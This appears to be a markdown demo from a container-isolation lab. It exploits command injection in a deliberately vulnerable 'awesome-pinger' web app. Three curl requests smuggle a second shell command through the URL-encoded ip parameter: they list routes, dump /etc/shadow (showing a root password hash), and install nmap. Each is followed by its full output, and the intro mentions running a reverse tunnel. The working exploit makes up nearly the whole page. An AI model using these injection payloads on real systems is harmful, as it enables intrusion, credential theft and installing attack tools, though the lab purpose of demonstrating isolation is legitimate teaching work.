## RCE attack examples on pinger

Due to poor or missing input sanitization, the application awesome-pinger(containers-app) contains a critical vulnerability that allows an attacker to execute arbitrary code on the remote machine under the UID of the pinger user.

Using curl, it is possible to execute any binary available on the system — or even install new software and run a reverse tunnel.

We will demonstrate the impact of container isolation on the vulnerable binary at several levels: on a legacy virtual machine, using manually configured namespaces, and inside a Docker environment.

To exploit this, you need some knowledge of Bash command chaining and a few encoding tricks, since curl doesn’t handle certain special characters (like spaces, dots, etc.) very well.

### ASCII table link 

https://www.rapidtables.com/code/text/ascii-table.html


### List local routes

```bash
$ curl "http://probeeh:8080?ip=127.0.0.1%3Bnetstat%20-rn" | jq -r .message
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   813    0   813    0     0    391      0 --:--:--  0:00:02 --:--:--   391
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.140 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.086 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.087 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2049ms
rtt min/avg/max/mdev = 0.086/0.104/0.140/0.025 ms
Kernel IP routing table
Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
0.0.0.0         10.1.8.1        0.0.0.0         UG        0 0          0 enp1s0
10.1.8.1        0.0.0.0         255.255.255.255 UH        0 0          0 enp1s0
10.4.8.0        0.0.0.0         255.255.255.0   U         0 0          0 enp1s0
```

### Get local password db

```bash
$ curl http://probeeh:8080?ip=127.0.0.1%3bcat%20%2fetc%2fshadow | jq .message -r
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1142    0  1142    0     0    546      0 --:--:--  0:00:02 --:--:--   546
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.086 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.088 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.081 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2064ms
rtt min/avg/max/mdev = 0.081/0.085/0.088/0.003 ms
root:$6$YMXWnS37FE7FROaI$rUPLf0aA/2YN5zTtlnZPnE9mElnVtATh0XG1.B3JzpHpEXgQOqv4S.6kFMlRZnelWevRElQjsl7Synk3Kq3us/::0:99999:7:::
bin:*:19820:0:99999:7:::
daemon:*:19820:0:99999:7:::
adm:*:19820:0:99999:7:::
lp:*:19820:0:99999:7:::
sync:*:19820:0:99999:7:::
shutdown:*:19820:0:99999:7:::
halt:*:19820:0:99999:7:::
mail:*:19820:0:99999:7:::
operator:*:19820:0:99999:7:::
games:*:19820:0:99999:7:::
ftp:*:19820:0:99999:7:::
nobody:*:19820:0:99999:7:::
systemd-coredump:!!:20108::::::
dbus:!!:20108::::::
sssd:!!:20108::::::
chrony:!!:20108::::::
tss:!!:20108::::::
rpc:!!:20108:0:99999:7:::
rpcuser:!!:20108::::::
sshd:!!:20108::::::
tcpdump:!!:20108::::::
```

### Install nmap

```bash
$ curl http://probeeh:8080?ip=127.0.0.1%3bdnf%20-y%20install%20nmap | jq .message -r
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2368    0  2368    0     0    233      0 --:--:--  0:00:10 --:--:--   606
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.089 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.088 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.082 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2046ms
rtt min/avg/max/mdev = 0.082/0.086/0.089/0.003 ms
Last metadata expiration check: 0:46:15 ago on Tue 17 Jun 2025 11:39:30 AM CEST.
Dependencies resolved.
================================================================================
 Package           Architecture   Version               Repository         Size
================================================================================
Installing:
 nmap              x86_64         3:7.92-3.el9          appstream         5.4 M
Installing dependencies:
 nmap-ncat         x86_64         3:7.92-3.el9          appstream         222 k

Transaction Summary
================================================================================
Install  2 Packages

Total download size: 5.7 M
Installed size: 24 M
Downloading Packages:
(1/2): nmap-ncat-7.92-3.el9.x86_64.rpm          1.4 MB/s | 222 kB     00:00    
(2/2): nmap-7.92-3.el9.x86_64.rpm               9.0 MB/s | 5.4 MB     00:00    
--------------------------------------------------------------------------------
Total                                           6.7 MB/s | 5.7 MB     00:00     
Running transaction check
Transaction check succeeded.
Running transaction test
Transaction test succeeded.
Running transaction
  Preparing        :                                                        1/1 
  Installing       : nmap-ncat-3:7.92-3.el9.x86_64                          1/2 
  Running scriptlet: nmap-ncat-3:7.92-3.el9.x86_64                          1/2 
  Installing       : nmap-3:7.92-3.el9.x86_64                               2/2 
  Running scriptlet: nmap-3:7.92-3.el9.x86_64                               2/2 
  Verifying        : nmap-ncat-3:7.92-3.el9.x86_64                          1/2 
  Verifying        : nmap-3:7.92-3.el9.x86_64                               2/2 

Installed:
  nmap-3:7.92-3.el9.x86_64             nmap-ncat-3:7.92-3.el9.x86_64            

Complete!
```